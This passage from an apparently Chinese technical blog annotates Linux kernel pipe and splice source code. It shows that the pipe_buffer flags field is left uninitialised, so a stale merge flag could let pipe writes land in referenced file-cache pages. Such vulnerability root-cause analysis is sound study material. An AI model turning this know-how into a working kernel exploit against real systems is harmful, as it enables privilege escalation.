a[&quot;memcpy_to_page(per page)&quot;]</code></pre><ul><li><strong>大致流程</strong>: 循环遍历pipe-&gt;bufs数组, 使用<code>copy_page_to_iter</code>将buf中的一整个page复制到iter中, 如果iter是pipe, 则不复制直接引用, 如此循环再顾及到截断等问题就结束读取. </li><li><code>copy_pipe_to_iter</code>真是够有迷惑性的, 它是指iter的类型是pipe, 要从addr指向的页面中复制内容到pipe buf中. </li><li>由于<code>copy_page_to_iter_pipe</code> pipe buf 是<strong>直接引用其他页</strong>，因此在 page_write 处<strong>必须确保新传来的数据不会写入这样的页面</strong>中，而这种保证就依赖于 MERGE 标志。然而可以看到一个有意思的事情：虽然 recv pipe buf 结构体上的众多字段都被重新赋值，<strong>但有一个字段却被遗漏了</strong>，<strong>那就是 flags 字段</strong>！</li><li><code>push_pipe</code>的作用是检查要写入的pipe的空间是否足够. 如果不够则进行扩充. 当 kernel 循环扩充 pipe_buffer 上的页时，这里也<strong>并没有初始化 pipe_buffer 的 flag 标志</strong>！又因为 pipe_buffer 在设计上便是一个环，因此在扩孔 pipe_buffer 时，这里也<strong>将重用先前 pipe_buffer 所设置的 flag</strong>。</li><li>一个小问题, 看到<code>void *kaddr = kmap_atomic(page);</code>函数, 查到了highmem这个<a href="https://dri.freedesktop.org/docs/drm/vm/highmem.html">概念</a>. 不过函数具体实现是和架构相关的.</li></ul><blockquote><p>这里简单总结一下 copy_page_to_iter 函数与 copy_to_iter 函数在<strong>复制数据进 pipe 时</strong> 所实现的差异：</p><ul><li>前者是在一个完整 page 上，将数据复制给 pipe。因此 pipe buf 只需直接引用该页，并记录下 offset 和 len，即可完成复制操作。</li><li>后者不保证源数据在完整 page 上，而是提供了 addr 和 len，因此 pipe buf 需要自己准备存放数据的 page。</li></ul></blockquote><p>copy_page_to_iter_pipe代码:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">size_t</span> <span class="hljs-title">copy_page_to_iter_pipe</span><span class="hljs-params">(struct page *page, <span class="hljs-keyword">size_t</span> offset, <span class="hljs-keyword">size_t</span> bytes,</span></span><br><span class="hljs-params"><span class="hljs-function">             struct iov_iter *i)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 获取待写入的 pipe 结构体</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span> =</span> i-&gt;pipe;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span>;</span><br>    <span class="hljs-comment">// 获取待写入的 pipe 结构体的一些信息，例如 head、tail等等 </span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> p_tail = pipe-&gt;tail;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> p_mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i_head = i-&gt;head;<br>    <span class="hljs-keyword">size_t</span> off;<br><br>    <span class="hljs-comment">// 这里是在做一些 check</span><br>    <span class="hljs-keyword">if</span> (unlikely(bytes &gt; i-&gt;count))<br>        bytes = i-&gt;count;<br><br>    <span class="hljs-keyword">if</span> (unlikely(!bytes))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">if</span> (!sanity(i))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <br>    <span class="hljs-comment">// 获取待写入的相对偏移位置</span><br>    off = i-&gt;iov_offset;<br>    <span class="hljs-comment">// 获取待接收数据的 pipe buf</span><br>    buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>    <span class="hljs-keyword">if</span> (off) &#123;<br>        <span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;<br>            <span class="hljs-comment">/* merge with the last one */</span><br>            buf-&gt;len += bytes;<br>            i-&gt;iov_offset += bytes;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>        i_head++;<br>        buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>    &#125;<br>    <span class="hljs-comment">// 如果待写入的管道已满，则直接返回</span><br>    <span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>    <span class="hljs-comment">// 增加该页的 refcount</span><br>    get_page(page);<br>    buf-&gt;page = page;   <span class="hljs-comment">// 直接引用已有的页</span><br>    buf-&gt;offset = offset;<br>    buf-&gt;len = bytes;<br><br>    pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>    i-&gt;iov_offset = offset + bytes;<br>    i-&gt;head = i_head;<br>out:<br>    i-&gt;count -= bytes;<br>    <span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="pipe-write"><a href="#pipe-write" class="headerlink" title="pipe_write"></a>pipe_write</h4><p><a href="https://elixir.bootlin.com/linux/v5.8-rc1/source/fs/pipe.c">源码</a> </p><p>pipe_write第一段: </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">head = pipe-&gt;head;<br>was_empty = pipe_empty(head, pipe-&gt;tail);<br>chars = total_len &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (chars &amp;&amp; !was_empty) &#123;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="hljs-number">1</span>) &amp; mask];<br>    <span class="hljs-keyword">int</span> offset = buf-&gt;offset + buf-&gt;len;<br><br>    <span class="hljs-keyword">if</span> ((buf-&gt;flags &amp; PIPE_BUF_FLAG_CAN_MERGE) &amp;&amp;<br>        offset + chars &lt;= PAGE_SIZE) &#123;<br>        ret = pipe_buf_confirm(pipe, buf);<br>        <span class="hljs-keyword">if</span> (ret)<br>            <span class="hljs-keyword">goto</span> out;<br><br>        ret = copy_page_from_iter(buf-&gt;page, offset, chars, from);<br>        <span class="hljs-keyword">if</span> (unlikely(ret &lt; chars)) &#123;<br>            ret = -EFAULT;<br>            <span class="hljs-keyword">goto</span> out;<br>        &#125;<br><br>        buf-&gt;len += ret;<br>        <span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>            <span class="hljs-keyword">goto</span> out;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>函数目的是从iter复制到pipe的buf中. </p><p>如果说当前 pipe buf 中已经存在数据，并且<br>iter总长度不是页大小的整数倍 &amp;&amp; pipe buf的起始位置+pipe已有数据长度+iter总长度mod页大小 &lt; PAGE_SIZE,<br>那么直接先把iter开头一段填充到pipe buf中进行数据合并。</p><p>这个合并操作需要 pipe buf 有 <strong>PIPE_BUF_FLAG_CAN_MERGE</strong> 标志，该标志只要 pipe_write 所对应的 fd 没有设置 O_DIRECT 标志即可自动设置。</p><p>其次是正常的页面写入逻辑：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-comment">// 如果一个管道没有读者，则说明管道已经被破坏，生成 SIGPIPE 信号</span><br>    <span class="hljs-keyword">if</span> (!pipe-&gt;readers) &#123;<br>        send_sig(SIGPIPE, current, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!ret)<br>            ret = -EPIPE;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">// 尝试循环往管道内写入数据</span><br>    head = pipe-&gt;head;<br>    <span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> mask = pipe-&gt;ring_size - <span class="hljs-number">1</span>;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">buf</span> =</span> &amp;pipe-&gt;bufs[head &amp; mask];<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> pipe-&gt;tmp_page;<br>        <span class="hljs-keyword">int</span> copied;<br>        <span class="hljs-comment">// 获取先前被释放但是缓存起来的 tmp_page。</span><br>        <span class="hljs-comment">// 如果存在 tmp_page 则在向 pipe buf 写入数据时就可直接重用而无需分配</span><br>        <span class="hljs-keyword">if</span> (!page) &#123;<br>            page = alloc_page(GFP_HIGHUSER | __GFP_ACCOUNT);<br>            <span class="hljs-keyword">if</span> (unlikely(!page)) &#123;<br>                ret = ret ? : -ENOMEM;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            pipe-&gt;tmp_page = page;<br>        &#125;<br><br>        <span class="hljs-comment">/* Allocate a slot in the ring in advance and attach an</span><br><span class="hljs-comment">             * empty buffer.  If we fault or otherwise fail to use</span><br><span class="hljs-comment">             * it, either the reader will consume it or it&#x27;ll still</span><br><span class="hljs-comment">             * be there for the next write.</span><br><span class="hljs-comment">             */</span><br>        spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>        head = pipe-&gt;head;<br>        <span class="hljs-keyword">if</span> (pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage)) &#123;<br>            spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        pipe-&gt;head = head + <span class="hljs-number">1</span>;<br>        spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);<br><br>        <span class="hljs-comment">/* Insert it into the buffer array */</span><br>        <span class="hljs-comment">// 往新的 pipe buf 中写入数据</span><br>        buf = &amp;pipe-&gt;bufs[head &amp; mask];<br>        buf-&gt;page = page;<br>        buf-&gt;ops = &amp;anon_pipe_buf_ops; <span class="hljs-comment">// 设置匿名管道操作</span><br>        buf-&gt;offset = <span class="hljs-number">0</span>;<br>        buf-&gt;len = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 如果 fd 设置了 O_DIRECT，则每次写入时都会占用新的一页，而不会合并</span><br>        <span class="hljs-keyword">if</span> (is_packetized(filp)) <br>            buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<br>        <span class="hljs-keyword">else</span><br>            buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<br>        pipe-&gt;tmp_page = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// 复制页数据</span><br>        copied = copy_page_from_iter(page, <span class="hljs-number">0</span>, PAGE_SIZE, from);<br>        <span class="hljs-keyword">if</span> (unlikely(copied &lt; PAGE_SIZE &amp;&amp; iov_iter_count(from))) &#123;<br>            <span class="hljs-keyword">if</span> (!ret)<br>                ret = -EFAULT;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        ret += copied;<br>        buf-&gt;offset = <span class="hljs-number">0</span>;<br>        buf-&gt;len = copied;<br><br>        <span class="hljs-keyword">if</span> (!iov_iter_count(from))<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!pipe_full(head, pipe-&gt;tail, pipe-&gt;max_usage))<br>        <span class="hljs-keyword">continue</span>;<br><br>    <span class="hljs-comment">/* Wait for buffer space to become available. */</span><br>    <span class="hljs-keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;<br>        <span class="hljs-keyword">if</span> (!ret)<br>            ret = -EAGAIN;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (signal_pending(current)) &#123;<br>        <span class="hljs-keyword">if</span> (!ret)<br>            ret = -ERESTARTSYS;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    ...<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这个 tmp_page 简单讲一下。如果该 pipe buf 所持有的 page 只有它自己持有，并且现在打算将其释放，那么 pipe buf 就私下不释放该 page，而是将其缓存起来供后续使用：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">anon_pipe_buf_release</span><span class="hljs-params">(struct pipe_inode_info *pipe,</span></span><br><span class="hljs-params"><span class="hljs-function">                  struct pipe_buffer *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> buf-&gt;page;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * If nobody else uses this page, and we don&#x27;t already have a</span><br><span class="hljs-comment">     * temporary page, let&#x27;s keep track of it as a one-deep</span><br><span class="hljs-comment">     * allocation cache. (Otherwise just release our reference to it)</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (page_count(page) == <span class="hljs-number">1</span> &amp;&amp; !pipe-&gt;tmp_page)<br>        pipe-&gt;tmp_page = page;<br>    <span class="hljs-keyword">else</span><br>        put_page(page);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>从 pipe 读写操作中我们可以得知，pipe bufs 存放的页面无非两种：</p><ol><li>直接引用其他不变页（例如文件缓存页），这样就无需进行数据复制操作</li><li>自己创建页，需要进行数据复制</li></ol><p>由 pipe 机制来保证存放在 pipe bufs 中的页数据，不会被 pipe 本身给覆写。同时注意只有在自己创建的页上，才能进行 Merge 操作。</p><p>这是因为pipe本意只是一个消息通道, <strong>不应出现对内存的预期外修改</strong>, 即merge操作. </p><h4 id="do-splice-函数"><a href="#do-splice-函数" class="headerlink" title="do_splice 函数"></a>do_splice 函数</h4><p>Linux 库函数 <code>splice</code> 的作用是，将某个 fd 的数据不经过用户层，直接拷贝进另一个 fd 中。其函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE         <span class="hljs-comment">/* See feature_test_macros(7) */</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">splice</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd_in, <span class="hljs-keyword">loff_t</span> *off_in, <span class="hljs-keyword">int</span> fd_out, <span class="hljs-keyword">loff_t</span> *off_out, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span>;<br></code></pre></div></td></tr></table></figure><p>这里的 fd 只能有两种情况：pipe fd 或 file fd，因此在 do_splice 函数中，内核也会对 fd 的类型做特判，来执行不同的数据传递操作。</p><p>这里，我们只需关注 <strong>From-fd 为 file，To-fd 为 pipe</strong> ，即<strong>数据从文件传递至管道</strong>的情况：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Determine where to splice to/from.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">do_splice</span><span class="hljs-params">(struct file *in, <span class="hljs-keyword">loff_t</span> __user *off_in,</span></span><br><span class="hljs-params"><span class="hljs-function">        struct file *out, <span class="hljs-keyword">loff_t</span> __user *off_out,</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">ipipe</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">opipe</span>;</span><br>    <span class="hljs-keyword">loff_t</span> offset;<br>    <span class="hljs-keyword">long</span> ret;<br><br>    ipipe = get_pipe_info(in);<br>    opipe = get_pipe_info(out);<br>    ...;<br>    <br>    <span class="hljs-comment">// 当数据从文件复制给管道时</span><br>    <span class="hljs-keyword">if</span> (opipe) &#123;<br>        ...<br>        <span class="hljs-comment">// 等待 pipe 存在空闲空间</span><br>        <span class="hljs-keyword">if</span> (out-&gt;f_flags &amp; O_NONBLOCK)<br>            flags |= SPLICE_F_NONBLOCK;<br><br>        pipe_lock(opipe);<br>        ret = wait_for_space(opipe, flags);<br>        <span class="hljs-comment">// 如果等到 pipe 存在空闲空间后</span><br>        <span class="hljs-keyword">if</span> (!ret) &#123;<br>            <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> p_space;<br>             <span class="hljs-comment">// 获取待传递数据大小</span><br>            <span class="hljs-comment">/* Don&#x27;t try to read more the pipe has space for. */</span><br>            p_space = opipe-&gt;max_usage - pipe_occupancy(opipe-&gt;head, opipe-&gt;tail);<br>            len = <span class="hljs-keyword">min_t</span>(<span class="hljs-keyword">size_t</span>, len, p_space &lt;&lt; PAGE_SHIFT);<br>            <span class="hljs-comment">// 执行真正的传递操作</span><br>            ret = do_splice_to(in, &amp;offset, opipe, len, flags);<br>        &#125;<br>        ...<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br><br>    ...<br>&#125;<br></code></pre></div></td></tr></table></figure><p>而在 do_splice_to 函数中，内核会根据<strong>文件系统类型</strong>，来调用对应的 splice_read 函数：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from a file to a pipe.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">long</span> <span class="hljs-title">do_splice_to</span><span class="hljs-params">(struct file *in, <span class="hljs-keyword">loff_t</span> *ppos,</span></span><br><span class="hljs-params"><span class="hljs-function">             struct pipe_inode_info *pipe, <span class="hljs-keyword">size_t</span> len,</span></span><br><span class="hljs-params"><span class="hljs-function">             <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> ret;<br><br>    <span class="hljs-keyword">if</span> (unlikely(!(in-&gt;f_mode &amp; FMODE_READ)))<br>        <span class="hljs-keyword">return</span> -EBADF;<br><br>    ret = rw_verify_area(READ, in, ppos, len);<br>    <span class="hljs-keyword">if</span> (unlikely(ret &lt; <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">return</span> ret;<br><br>    <span class="hljs-keyword">if</span> (unlikely(len &gt; MAX_RW_COUNT))<br>        len = MAX_RW_COUNT;<br>    <span class="hljs-comment">// 调用 splice_read 函数</span><br>    <span class="hljs-keyword">if</span> (in-&gt;f_op-&gt;splice_read)<br>        <span class="hljs-keyword">return</span> in-&gt;f_op-&gt;splice_read(in, ppos, pipe, len, flags);<br>    <span class="hljs-keyword">return</span> default_file_splice_read(in, ppos, pipe, len, flags);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>以 linux 中最常见的文件系统 ext4 为例，这是 ext4 文件系统中所设置的一些关键方法：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// fs/ext4/file.c</span><br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">ext4_file_operations</span> =</span> &#123;<br>    ...<br>    .read_iter    = ext4_file_read_iter,<br>    ...<br>    .splice_read  = generic_file_splice_read,<br>    ...<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>因此最终 do_splice_to 函数会调用到 generic_file_splice_read 函数来执行数据传递：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * generic_file_splice_read - splice data from file to a pipe</span><br><span class="hljs-comment"> * @in:      file to splice from</span><br><span class="hljs-comment"> * @ppos:    position in @in</span><br><span class="hljs-comment"> * @pipe:    pipe to splice to</span><br><span class="hljs-comment"> * @len:     number of bytes to splice</span><br><span class="hljs-comment"> * @flags:   splice modifier flags</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Description:</span><br><span class="hljs-comment"> *    Will read pages from given file and fill them into a pipe. Can be</span><br><span class="hljs-comment"> *    used as long as it has more or less sane -&gt;read_iter().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">generic_file_splice_read</span><span class="hljs-params">(struct file *in, <span class="hljs-keyword">loff_t</span> *ppos,</span></span><br><span class="hljs-params"><span class="hljs-function">                 struct pipe_inode_info *pipe, <span class="hljs-keyword">size_t</span> len,</span></span><br><span class="hljs-params"><span class="hljs-function">                 <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> flags)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">to</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kiocb</span> <span class="hljs-title">kiocb</span>;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i_head;<br>    <span class="hljs-keyword">int</span> ret;<br>    <br>    <span class="hljs-comment">// 根据 pipe 结构体，创建 iov_iter 结构</span><br>    iov_iter_pipe(&amp;to, READ, pipe, len);<br>    i_head = to.head;<br>    <span class="hljs-comment">// 创建 kiocb 结构</span><br>    init_sync_kiocb(&amp;kiocb, in);<br>    kiocb.ki_pos = *ppos;<br>    <span class="hljs-comment">// 调用 call_read_iter 执行实际的数据传输操作 ！！！</span><br>    ret = call_read_iter(in, &amp;kiocb, &amp;to);<br>    <span class="hljs-comment">// 如果数据正常传输</span><br>    <span 